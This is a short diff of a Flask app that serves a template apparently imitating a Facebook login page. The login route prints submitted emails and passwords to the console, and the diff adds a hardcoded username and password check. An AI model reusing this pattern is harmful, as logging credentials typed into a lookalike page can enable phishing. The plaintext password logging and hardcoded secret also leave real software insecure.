@@ -2,7 +2,7 @@ from flask import Flask, request, render_template
 
 app = Flask(__name__)
 
-@app.route('/')
+@app.route('/')  
 def index():
     error = False
     return render_template("siteFacebookPHoneDesigne.html",error = error)
@@ -14,7 +14,10 @@ def login():
     password = request.form.get('password')
     print(email)
     print(password)
-    return render_template("siteFacebookPHoneDesigne.html" , error = error)
+    if str(email) == "moaad" and str(password) == "afellah":
+        return render_template("gold-site.html")
+    else:
+        return render_template("siteFacebookPHoneDesigne.html" , error = error)
 
 # @app.route('/',methods=['GET'])
 # def index():
